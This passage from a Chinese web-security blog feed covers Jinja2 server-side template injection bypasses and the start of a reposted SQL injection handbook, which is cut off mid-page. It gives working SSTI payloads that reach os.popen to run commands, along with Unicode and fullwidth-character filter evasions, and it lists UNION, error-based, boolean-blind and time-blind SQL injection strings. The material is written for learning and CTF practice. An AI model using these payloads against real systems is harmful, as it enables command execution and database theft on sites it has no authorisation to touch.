class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure><p>其中<code>print</code>用来绕过<code>&#123;&#123;&#125;&#125;`，`attr`绕过`.`。然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>再使用Unicode编码绕过![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>所以官方给的payload就是：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>在线网址转换：https://www.branah.com/unicode-converterPHP脚本转换：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>### 魔改字符太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p><p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B</span><br></pre></td></tr></table></figure><h2 id="Reference">Reference</h2><p><a href="http://www.cl4y.top/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">http://www.cl4y.top/ssti模板注入学习/</a></p><p><a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python沙箱逃逸/</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y">https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y</a></p><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p><p><a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p><p><a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p><p><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;jinja2-SSTI-Bypass&quot;&gt;jinja2 SSTI &amp;amp; Bypass&lt;/h1&gt;
&lt;p&gt;本文主要针对jinja2的SSTI做一些讲解和说明。&lt;/p&gt;
&lt;h2 id=&quot;常用的内建属性&quot;&gt;常用的内建属性&lt;/h2&gt;
&lt;h3 id=&quot;class&quot;&gt;&lt;co
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SSTI" scheme="http://ca0y1h.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入手册</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-10T15:13:56.000Z</published>
    <updated>2020-12-10T15:17:55.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入手册【转】">SQL注入手册【转】</h1><blockquote><p>来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C</p></blockquote><h2 id="常见数据库搭配">常见数据库搭配</h2><ul><li>ASP + ACCESS + IIS</li><li><a href="http://ASP.NET">ASP.NET</a> + MSSQL +IIS</li><li>PHP + Mysql + Apache(Nginx)</li><li>JSP + Oracle(Mysql) + Tomcat</li></ul><p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步</p><h2 id="Mysql">Mysql</h2><h3 id="基础">基础</h3><h4 id="数据库名">数据库名</h4><ul><li><p>database()</p></li><li><p>schema()</p></li></ul><h4 id="当前登陆用户">当前登陆用户</h4><ul><li><p>USER()</p></li><li><p>CURRENT_USER()</p></li><li><p>SYSTEM_USER()</p></li><li><p>SESSION_USER()</p></li></ul><h4 id="数据库版本">数据库版本</h4><ul><li><p>VERSION()</p></li><li><p>@@VERSION</p></li><li><p>@@GLOBAL.VERSION</p></li></ul><h4 id="路径相关">路径相关</h4><ul><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li><li><p>@@DATADIR : 数据存储路径</p></li><li><p>@@CHARACTER_SETS_DIR : 字符集设置文件路径</p></li><li><p>@@LOG_ERROR : 错误日志文件路径</p></li><li><p>@@PID_FILE : pid-file文件路径</p></li><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li></ul><h4 id="字符串连接">字符串连接</h4><ul><li>concat(str1,str2) //将字符串首尾相连</li><li>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</li><li>group_concat()//</li></ul><h4 id="字符截断">字符截断</h4><ul><li>left(str,index) //从左边第index开始截取</li><li>right(str,index) //从右边第index开始截取</li><li>substring(str,index) //从左边index开始截取</li><li>substr(str,index,len) //截取str,index开始,截取len的长度</li><li>mid(str,index,ken) //截取str 从index开始,截取len的长度</li></ul><h4 id="字符串比较函数">字符串比较函数</h4><ul><li>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</li><li>find_in_set(str,strlist) //如果相同则返回1不同则返回0</li></ul><h4 id="注释">注释</h4><ul><li><p>–(后面还有个空格)</p></li><li><p># 单行注释符，url编码为%23</p></li><li><p>/*…*/</p></li><li><p>/! 语句 / 语句会被执行 可用做分割</p></li></ul><h4 id="运算符">运算符</h4><p>比较运算符</p><ul><li><p>=</p></li><li><p>&gt;</p></li><li><p>&lt;</p></li><li><p>!=</p></li><li><p>&lt;&gt; 不等于的意思</p></li><li><p>like (模糊匹配 <code>select '12345' like '12%' =&gt; true</code>)</p></li><li><p>in（<code>select '123' in ('12') =&gt; false</code>）</p></li><li><p>between (<code>select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';</code>)</p></li><li><p>regexp / rlike(正则匹配<code>select '123455' regexp '^12' =&gt; true</code>)</p></li></ul><p>算术运算符</p><ul><li><ul><li></li></ul></li><li>-</li><li><ul><li></li></ul></li><li>/</li></ul><p>逻辑运算符</p><ul><li>not / ！</li><li>and / &amp;&amp;</li><li>or / ||</li><li>xor / ^</li></ul><p>位运算符</p><ul><li>&amp; 按位与</li><li>| 按位或</li><li>^ 按位异或</li><li>! 取反</li><li>&lt;&lt; 左移</li><li>&gt;&gt;右移</li></ul><h4 id="绕过函数">绕过函数</h4><ul><li>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</li><li>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</li></ul><h4 id="延时函数">延时函数</h4><ul><li>sleep()</li><li>benchmark(1000000,sha(1))</li></ul><h4 id="编码函数">编码函数</h4><ul><li>hex()</li><li>ascii()</li></ul><h4 id="文件函数">文件函数</h4><ul><li>load_file() //读文件路径可以用0x，char转换的字符</li><li>outfile <code>select * into outfile '/tmp/test.txt'</code></li><li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</li></ul><h3 id="构造语句">构造语句</h3><h4 id="条件语句">条件语句</h4><ul><li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li><li><code>select case when (条件) then 代码1 else 代码 2 end</code></li></ul><h4 id="information-schema-结构">information_schema 结构</h4><ul><li>information_schema.tables:<br>查询表名:table_name 对应的数据库名: table_schema</li><li>information_schema.columns:<br>查询列名:column_name 对应的表名:table_schemam</li></ul><h4 id="Mysql注入语句一般形式">Mysql注入语句一般形式</h4><ul><li>联合 <code>构造联合语句 + 查询结果</code></li><li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li><li>报错 <code>构造报错语句 + 查询结果</code></li></ul><h4 id="Mysql空白字符">Mysql空白字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure><p>函数名和括号直接可以插入特殊字符 ex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure><h3 id="判断注入是否存在">判断注入是否存在</h3><p>数值型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+1</span><br><span class="line">?id&#x3D;-1 or 1&#x3D;1</span><br><span class="line">?id&#x3D;-1 or 10-2&#x3D;8</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p>字符型注入<br>参数被引号包围，所以需要闭合引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><p>闭合后构造语句再注释后面</p><h3 id="四大基本注入类型">四大基本注入类型</h3><h4 id="UNION注入">UNION注入</h4><p>最简单的注入</p><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p><p><strong>ORDER BY</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure><p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数</p><p><strong>UNION SELECT</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure><p><strong>数据库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure><p><strong>表查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>字段查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>数据获取</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure><h4 id="报错注入">报错注入</h4><p><strong>常见报错payload</strong></p><ul><li><p>floor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></li><li><p>updatexml() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure></li><li><p>extractvalue() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure></li><li><p>exp() <a href="//5.5.xn--5-bs6a4sito1pkfo13kbusp3f">//5.5.5版本之后可以使用</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure></li><li><p>name_const //支持老版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure></li><li><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure></li></ul><h4 id="布尔盲注">布尔盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure><h4 id="时间盲注">时间盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure><p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替</p><p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p><p>除开最常见的sleep延时，还有以下姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure><p><strong>比赛姿势</strong></p><ul><li><p>笛卡尔积</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure></li></ul><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><ul><li>GET_LOCK</li></ul><p>是pwnhub的一道题目<br>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>太少用到不赘述了<br><a href="https://zhuanlan.zhihu.com/p/35245598">https://zhuanlan.zhihu.com/p/35245598</a></p><ul><li>RLIKE</li></ul><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure><h3 id="Mysql注入杂技">Mysql注入杂技</h3><h4 id="insert-update-delete注入">insert/update/delete注入</h4><p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>本质是在闭合语句后通过子查询进行注入，通常为盲注</p><h5 id="update">update</h5><p>一段我在实战中遇到的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);</span><br><span class="line">if(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&#123;\&quot;success\&quot;:true,\&quot;msg\&quot;:\&quot;回复成功!\&quot;&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&#123;\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;回复失败!\&quot;&#125;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set 和 where 处都可以注入<br>建议在where处进行注入</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(1) %23</span><br></pre></td></tr></table></figure><p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p><p>但是字符型又有另一个坑点<br>字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code></p><p>但是或逻辑运算中同样存在问题</p><p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>测试只有字符为0时才会执行or后的sleep</p><p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p><p>异或的坑点和或相似<br>当字符不为数字时不会执行，具体深层原因先留坑吧</p><p>这里还有坑…</p><p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值</p><p>测试mysql版本5.3.72</p><h5 id="insert-delete">insert/delete</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;);</span><br></pre></td></tr></table></figure><p>类似update，不赘述了</p><h4 id="Order-by注入">Order by注入</h4><p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>ctf中的进阶形式为order by 一个特定字段<br>比如hctf中的一道题目</p><h4 id="宽字节注入">宽字节注入</h4><p><strong>原理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 